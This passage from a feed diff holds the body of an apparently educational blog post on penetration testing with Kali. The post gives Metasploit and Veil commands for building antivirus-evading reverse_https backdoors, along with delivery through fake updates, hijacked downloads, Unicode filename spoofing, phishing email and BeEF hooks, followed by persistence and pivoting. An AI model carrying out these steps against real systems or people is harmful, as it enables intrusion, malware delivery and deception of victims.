-&lt;li&gt;&lt;code&gt;use [something]&lt;/code&gt; (uses an exploit, payload, auxilarie)&lt;/li&gt;
-&lt;li&gt;&lt;code&gt;set [option] [value]&lt;/code&gt; (configure [option] to have [value] )&lt;/li&gt;
-&lt;li&gt;&lt;code&gt;exploit&lt;/code&gt; - runs the current task&lt;/li&gt;
-&lt;/ul&gt;
-&lt;h5 id="an-example-backdoor-attack"&gt;An Example Backdoor Attack&lt;/h5&gt;
-&lt;p&gt;Typically this will only work if the backdoor is already installed on the target computer.&lt;/p&gt;
-&lt;ol&gt;
-&lt;li&gt;find out the exploit to use via google&lt;/li&gt;
-&lt;li&gt;open &lt;code&gt;msfconsole&lt;/code&gt;&lt;/li&gt;
-&lt;li&gt;type &lt;code&gt;use [exploit_name/path]&lt;/code&gt;&lt;/li&gt;
-&lt;li&gt;&lt;code&gt;show options&lt;/code&gt;&lt;/li&gt;
-&lt;li&gt;set the options (usually the RHOSTS) `set RHOSTS [ip]&lt;/li&gt;
-&lt;li&gt;run &lt;code&gt;exploit&lt;/code&gt;&lt;/li&gt;
-&lt;/ol&gt;
-&lt;p&gt;If this is successful, you will now have access to a remote terminal in the target and essentially do anything you want on the target machine.&lt;/p&gt;
-&lt;h5 id="payloads"&gt;Payloads&lt;/h5&gt;
-&lt;p&gt;A payload is a piece of code that is to be executed through an existing exploit. For example twp types of payloads are to:&lt;/p&gt;
-&lt;ul&gt;
-&lt;li&gt;to open a port on the target and connect to it (aka &lt;code&gt;bind&lt;/code&gt;)&lt;/li&gt;
-&lt;li&gt;open a port on the attacking computer, connect to the attacking computer from the target bypassing the firewall (aka &lt;code&gt;reverse&lt;/code&gt;)&lt;/li&gt;
-&lt;/ul&gt;
-&lt;blockquote&gt;
-&lt;p&gt;On a &lt;code&gt;reverse&lt;/code&gt;, setting the open port on the attacking computer to 80, will mimic that of a typical webserver and thus also bypassing any firewall filtration.&lt;/p&gt;
-&lt;/blockquote&gt;
-&lt;p&gt;Setting a payload in metasploit can be done with the option &lt;code&gt;set payload [payload]&lt;/code&gt;.&lt;/p&gt;
-&lt;h4 id="nexpose"&gt;Nexpose&lt;/h4&gt;
-&lt;p&gt;Nexpose is another product from the creators of metasploitable, and it is a vulnerability scanner. Nexpose will find any available exploits in your network that could be used, this could be used from a red team (attacker) and blue team (defender) perspective!&lt;/p&gt;
-&lt;p&gt;&lt;a href="https://www.rapid7.com/products/nexpose/"&gt;&lt;img alt="Nexpose" class="img-fluid" src="https://jackmckew.dev/img/nexpose.jpg"/&gt;&lt;/a&gt;&lt;/p&gt;
-&lt;p&gt;Nexpose can be downloaded from: &lt;a href="https://www.rapid7.com/products/nexpose/"&gt;https://www.rapid7.com/products/nexpose/&lt;/a&gt;.&lt;/p&gt;
-&lt;blockquote&gt;
-&lt;p&gt;There is a free community edition!&lt;/p&gt;
-&lt;/blockquote&gt;
-&lt;h3 id="client-side-attacks"&gt;Client Side Attacks&lt;/h3&gt;
-&lt;p&gt;Client side attacks are typically the next step if server side attacks fail or are not viable in the situation. Although, client side attacks can potentially be more difficult to accomplish as we are now (likely) depending on the weakest link in the security to be the human rather than a computer. In client side attacks, social engineering is one of the most used attack vectors, which also means that gaining as much information as possible about the target is critical for a successful attack.&lt;/p&gt;
-&lt;h4 id="creating-backdoors"&gt;Creating Backdoors&lt;/h4&gt;
-&lt;p&gt;For creating backdoors we use a program called &lt;code&gt;veil&lt;/code&gt;. Veil can installed via &lt;code&gt;apt-get&lt;/code&gt;, and the source code is all open over at: &lt;a href="https://github.com/Veil-Framework/Veil"&gt;https://github.com/Veil-Framework/Veil&lt;/a&gt;.&lt;/p&gt;
-&lt;p&gt;To use Veil: (use evasion, and use a rev_https (aka reverse https connection)):&lt;/p&gt;
-&lt;ol&gt;
-&lt;li&gt;Run &lt;code&gt;veil&lt;/code&gt;&lt;/li&gt;
-&lt;li&gt;&lt;code&gt;list&lt;/code&gt; to list available tools&lt;/li&gt;
-&lt;li&gt;&lt;code&gt;use [toolname]&lt;/code&gt; to use tools, evasion is a typical tool to use&lt;/li&gt;
-&lt;li&gt;&lt;code&gt;list&lt;/code&gt; (under a tool) to see available payloads&lt;/li&gt;
-&lt;li&gt;&lt;code&gt;use [payload number]&lt;/code&gt;&lt;/li&gt;
-&lt;li&gt;check the options to set&lt;/li&gt;
-&lt;li&gt;be sure to set the LHOST (the IP for the target to connect to)&lt;/li&gt;
-&lt;li&gt;&lt;code&gt;set LHOST [ip]&lt;/code&gt;&lt;/li&gt;
-&lt;li&gt;if you have a webserver running change to port, a good port is 8080 (an alternate port used by webservers)&lt;/li&gt;
-&lt;li&gt;&lt;code&gt;set LPORT 8080&lt;/code&gt;&lt;/li&gt;
-&lt;li&gt;&lt;code&gt;options&lt;/code&gt; to see options.&lt;/li&gt;
-&lt;/ol&gt;
-&lt;blockquote&gt;
-&lt;p&gt;For bypassing more antivirus programs, the more options you change, the less likely an existing identified signature is out there, we can change these options with
-    1.  &lt;code&gt;set PROCESSORS [number(1)]&lt;/code&gt; change processors.
-    2.  &lt;code&gt;set SLEEP [number(6)]&lt;/code&gt;&lt;/p&gt;
-&lt;/blockquote&gt;
-&lt;p&gt;Finally use &lt;code&gt;generate&lt;/code&gt; to make backdoor.&lt;/p&gt;
-&lt;ul&gt;
-&lt;li&gt;To check if it is detectable you can use the check vt command (this will only check signatures)&lt;/li&gt;
-&lt;li&gt;go to &lt;a href="https://nodistribute.com/"&gt;https://nodistribute.com/&lt;/a&gt; and scan there&lt;/li&gt;
-&lt;/ul&gt;
-&lt;h5 id="connecting-from-the-backdoor"&gt;Connecting from the Backdoor&lt;/h5&gt;
-&lt;p&gt;We need to listen for the connection. Need the attack payload and the port (eg, go/meterpeter/rev_https, 8080)&lt;/p&gt;
-&lt;ol&gt;
-&lt;li&gt;Open the metasploit framework. &lt;code&gt;msfconsole&lt;/code&gt;&lt;/li&gt;
-&lt;li&gt;To listen use the handler module&lt;/li&gt;
-&lt;li&gt;&lt;code&gt;use exploit/multi/handler&lt;/code&gt;&lt;/li&gt;
-&lt;li&gt;set the payload &lt;code&gt;set PAYLOAD windows/meterpeter/reverse_https&lt;/code&gt;&lt;/li&gt;
-&lt;li&gt;set the correct settings (the LPORT and LHOST you used in the backdoor).&lt;/li&gt;
-&lt;li&gt;&lt;code&gt;exploit&lt;/code&gt;&lt;/li&gt;
-&lt;/ol&gt;
-&lt;p&gt;Now we wait for the target user to run the backdoor (the &lt;code&gt;.exe&lt;/code&gt; file).&lt;/p&gt;
-&lt;h5 id="deploying-backdoors-via-fake-updates"&gt;Deploying Backdoors via Fake Updates&lt;/h5&gt;
-&lt;p&gt;By mimicking an update server for a software package, we can hide out backdoor as a new update for a software. To do this we use &lt;code&gt;Evilgrade&lt;/code&gt; (which is also fully open source): &lt;a href="https://github.com/infobyte/evilgrade"&gt;https://github.com/infobyte/evilgrade&lt;/a&gt;. Once &lt;code&gt;evilgrade&lt;/code&gt; is installed, you can check hijackable programs using &lt;code&gt;show modules&lt;/code&gt;, configure options for said modules using &lt;code&gt;configure [module_name]&lt;/code&gt; and start &lt;code&gt;evilgrade&lt;/code&gt; with &lt;code&gt;start&lt;/code&gt;.&lt;/p&gt;
-&lt;p&gt;This then makes use of MITM attacks such as ARP or DNS spoofing, read more about these in my previous post at [INSERT KALI NETWORK HACKING POST].&lt;/p&gt;
-&lt;blockquote&gt;
-&lt;p&gt;When using evilgrade, ensuring that the exploit is listening before mimicking the update server with the malicious software.&lt;/p&gt;
-&lt;/blockquote&gt;
-&lt;h5 id="deploying-backdoors-via-exe-downloads"&gt;Deploying Backdoors via Exe Downloads&lt;/h5&gt;
-&lt;p&gt;Another way to deploy backdoors, is to intercept an &lt;code&gt;.exe&lt;/code&gt; that is being downloaded on the target and replace it with the malicious &lt;code&gt;.exe&lt;/code&gt;. It's necessary to be the MITM to undertake this attack.&lt;/p&gt;
-&lt;p&gt;One way to do this (although unsupported as of 08/2017) is via BDFProxy: &lt;a href="https://github.com/secretsquirrel/BDFProxy"&gt;https://github.com/secretsquirrel/BDFProxy&lt;/a&gt;.&lt;/p&gt;
-&lt;p&gt;Once up and running, whenever a user attempts to download an &lt;code&gt;.exe&lt;/code&gt;, it'll be intercepted and injected with the malicious backdoor. Note that the target &lt;code&gt;.exe&lt;/code&gt; will be downloaded and run as normal, not raising any suspicions from the user.&lt;/p&gt;
-&lt;h4 id="protection"&gt;Protection&lt;/h4&gt;
-&lt;ul&gt;
-&lt;li&gt;Ensure that there is no MITM in your network&lt;/li&gt;
-&lt;li&gt;Only download from HTTPS pages&lt;/li&gt;
-&lt;li&gt;Use checksums to ensure the download is as the provider desired it to be (eg, MD5)&lt;/li&gt;
-&lt;/ul&gt;
-&lt;h3 id="social-engineering"&gt;Social Engineering&lt;/h3&gt;
-&lt;p&gt;The definition of social engineering (in information security context) is: "the use of deception to manipulate individuals into divulging confidential or personal information that may be used for fraudulent purposes.". The aim of the game is to gather as much information as possible about our target such that we can better pose an attack.&lt;/p&gt;
-&lt;h4 id="maltego"&gt;Maltego&lt;/h4&gt;
-&lt;p&gt;Maltego is a piece of software that we can easily &amp;amp; quickly gather information about a target, it can be downloaded from: &lt;a href="https://www.maltego.com/"&gt;https://www.maltego.com/&lt;/a&gt;. It can be used to determine where a specific target has accounts, websites, phone numbers, etc and who they may connect with. It shows all this in a graph representation in the client.&lt;/p&gt;
-&lt;h4 id="backdooring-any-file-type"&gt;Backdooring Any File Type&lt;/h4&gt;
-&lt;p&gt;This is typically done by compiling a malicious script and then disguising it as the source file. Note that this may not work for more technically advanced targets, as when you change the icon for a &lt;code&gt;.exe&lt;/code&gt; file, there will still be a prompt to run this file when opened.&lt;/p&gt;
-&lt;p&gt;For example, if you are trying to disguise a PDF, normally users aren't asked to run a PDF when opened, so this may raise suspicions with the target, and potentially foiling the attack.&lt;/p&gt;
-&lt;h5 id="spoofing-file-type"&gt;Spoofing File Type&lt;/h5&gt;
-&lt;p&gt;In the above example, we highlighted concerns that our file will prompt to be run and have the extension &lt;code&gt;.exe&lt;/code&gt;. We can circumvent this problem by spoofing our executable to look as if it was the original file type (eg, &lt;code&gt;.pdf&lt;/code&gt;). One way to do this is by using the right to left unicode character in the filename (&lt;code&gt;U+202E&lt;/code&gt;).&lt;/p&gt;
-&lt;p&gt;So what we will do is if our target file that we want to disguise as is name &lt;code&gt;the-book-of-reflex.pdf&lt;/code&gt;. We will name our malicious executable as &lt;code&gt;the-book-of-reflfdp.exe&lt;/code&gt;, and insert a right to left unicode character before &lt;code&gt;fdp.exe&lt;/code&gt;, which will reverse the end of our file, thus ending up with &lt;code&gt;the-book-of-reflexe.pdf&lt;/code&gt;.&lt;/p&gt;
-&lt;blockquote&gt;
-&lt;p&gt;Browsers will typically remove the right to left unicode character in file names, so make sure to zip the malicious file to bypass this.&lt;/p&gt;
-&lt;/blockquote&gt;
-&lt;h4 id="spoofing-fake-emails"&gt;Spoofing Fake Emails&lt;/h4&gt;
-&lt;p&gt;There's lots of free options out there on the web for sending fake emails, but they will likely end up in the spam box of the target's email. Another option is to find a SMTP (Simple Mail Transfer Protocol) server that offers a free program, typically these are used for marketing by companies so less likely to end up in the spam.&lt;/p&gt;
-&lt;p&gt;Kali also provides a utility called &lt;code&gt;sendemail&lt;/code&gt; which we can use once we have a SMTP server to use. Find out more about this utility (with the source code) over at: &lt;a href="https://github.com/mogaal/sendemail"&gt;https://github.com/mogaal/sendemail&lt;/a&gt;.&lt;/p&gt;
-&lt;p&gt;Once we're able to send a fake email, we can now embed our spoofed malicious executable on a file sharing website (eg, Google drive) and include it in the email (see &lt;a href="#backdooring-any-file-type"&gt;Backdooring Any File Type&lt;/a&gt;).&lt;/p&gt;
-&lt;blockquote&gt;
-&lt;p&gt;It's advisable to use an existing email that you know your target is familiar with from the information that you've gathered.&lt;/p&gt;
-&lt;/blockquote&gt;
-&lt;h4 id="beef-browser-exploitation-framework"&gt;BeEF (Browser Exploitation Framework)&lt;/h4&gt;
-&lt;p&gt;From the BeEF website itself: "BeEF is short for The Browser Exploitation Framework. It is a penetration testing tool that focuses on the web browser.". You can also find the source code over at &lt;a href="https://github.com/beefproject/beef"&gt;https://github.com/beefproject/beef&lt;/a&gt;.&lt;/p&gt;
-&lt;p&gt;What BeEF let's us do is insert some JavaScript code onto a website to 'hook' the website, allowing us to do lots of different things (eg, fake login pages, etc). Since the hook is just embedded in sites with JavaScript, this will enable attacks on any modern browser and device (eg, phones, tablets, laptops, etc).&lt;/p&gt;
-&lt;p&gt;Once hooked you get all sorts of information on the target system including browser version, operating system, versions of capabilities (plugins) installed etc.&lt;/p&gt;
-&lt;blockquote&gt;
-&lt;p&gt;It is easiest to deploy BeEF and run the commands when you are the MITM in the network. This will also allow us to hook &lt;strong&gt;all&lt;/strong&gt; websites the user visits rather than just the one.&lt;/p&gt;
-&lt;/blockquote&gt;
-&lt;p&gt;One example command we can use is to mimic a browser plug-in update to get the target to download and run a malicious backdoor.&lt;/p&gt;
-&lt;h4 id="using-the-above-outside-the-local-network"&gt;Using the Above - Outside the Local Network&lt;/h4&gt;
-&lt;p&gt;If you are using any of these attacks external to your local network, there's a few steps to configure to ensure:&lt;/p&gt;
-&lt;ol&gt;
-&lt;li&gt;Router must handle reverse connections&lt;/li&gt;
-&lt;li&gt;Use public IP vs Private IP of the router&lt;/li&gt;
-&lt;li&gt;Forward the targeted port of the router to the attacking machine in the local network&lt;/li&gt;
-&lt;/ol&gt;
-&lt;h2 id="post-exploitation"&gt;Post Exploitation&lt;/h2&gt;
-&lt;p&gt;The main part of launching a hack is not only to get access to a target PC, but get/find what's on the target and make sure that we can always get into the target. Another prime example on conducting a hack on a target PC, may not be to get to that exact machine, more so to get into the network that machine is connected to and find other resources (this is also known as pivoting).&lt;/p&gt;
-&lt;h3 id="maintaining-access"&gt;Maintaining Access&lt;/h3&gt;
-&lt;p&gt;Once you have backdoored into a system, the backdoor connection is likely running on a process (similar to what you see in task manager on Windows), it's typically good practice to migrate the backdoor connection onto a process that is unlikely to be closed (eg, &lt;code&gt;explorer.exe&lt;/code&gt;). If you are using metasploit for this, it's as easy as running &lt;code&gt;migrate [processID]&lt;/code&gt;.&lt;/p&gt;
-&lt;p&gt;There's also other methodologies for maintaining access such as:&lt;/p&gt;
-&lt;ul&gt;
-&lt;li&gt;Using veil-evasion (see &lt;a href="#creating-backdoors"&gt;Creating Backdoors&lt;/a&gt;)&lt;/li&gt;
-&lt;li&gt;Use metasploit persistence to maintain the connection&lt;/li&gt;
-&lt;li&gt;Use metasploit and veil-evasion together:&lt;ol&gt;
-&lt;li&gt;Background your current meterpeter session &lt;code&gt;background&lt;/code&gt;&lt;/li&gt;
-&lt;li&gt;use a module in msfconsole &lt;code&gt;use exsploit/windows/local/persistance&lt;/code&gt;&lt;/li&gt;
-&lt;li&gt;&lt;code&gt;show options&lt;/code&gt; to configure&lt;/li&gt;
-&lt;li&gt;&lt;code&gt;set EXE_NAME browser&lt;/code&gt; (or something inconspicuous)&lt;/li&gt;
-&lt;li&gt;set the session you wish to place &lt;code&gt;set SESSION [no.]&lt;/code&gt;&lt;/li&gt;
-&lt;li&gt;use the EXE::Custom the inject veil backdoor (not service).&lt;/li&gt;
-&lt;li&gt;&lt;code&gt;set EXE::Custom [path]&lt;/code&gt;&lt;/li&gt;
-&lt;li&gt;&lt;code&gt;exploit&lt;/code&gt;&lt;/li&gt;
-&lt;/ol&gt;
-&lt;/li&gt;
-&lt;/ul&gt;
-&lt;h3 id="pivoting"&gt;Pivoting&lt;/h3&gt;
-&lt;p&gt;Use the device you hacked, hack into other devices on the intranet. We can set up an autoroute to use metasploit on the infected target as if it was the source attacking device.&lt;/p&gt;
-&lt;ol&gt;
-&lt;li&gt;Upload any tools you need. (in metasploit) eg. Nmap&lt;/li&gt;
-&lt;li&gt;use autoroute (in metasploit)&lt;/li&gt;
-&lt;li&gt;&lt;code&gt;use post/windows/manage/autoroute&lt;/code&gt;&lt;/li&gt;
-&lt;li&gt;&lt;code&gt;set subnet [subnet]&lt;/code&gt; - Set the subnet to the first 3 dots then 0 ie. xx.xx.xx.0&lt;/li&gt;
-&lt;li&gt;&lt;code&gt;set session [id]&lt;/code&gt; - Sets the session to run it on.&lt;/li&gt;
-&lt;li&gt;&lt;code&gt;exploit&lt;/code&gt;&lt;/li&gt;
 &lt;/ol&gt;</content><category term="Software"></category><category term="software"></category><category term="infosec"></category></entry></feed>
